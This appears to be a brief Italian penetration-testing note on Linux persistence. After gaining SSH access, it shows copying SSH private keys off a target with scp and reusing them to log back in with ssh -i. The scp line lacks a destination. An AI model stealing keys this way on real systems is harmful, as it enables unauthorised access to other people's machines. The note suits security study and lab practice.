
# Persistenza su Linux tramite SSG
Dopo aver ottenuto l'accesso a ssh su un target, cerchiamo delle chiavi ssh all'interno del sistema e le scarichiamo sul nostro sistema tramite il comando: 
```bash
# fuori dal terminale ssh
scp <username>@<IP>:path/del/file  
```
adesso possiamo effettuare il login tramite ssh tramite la chiave ottenuta: 
````bash
ssh -i <chiave> <username>@<IP>
```
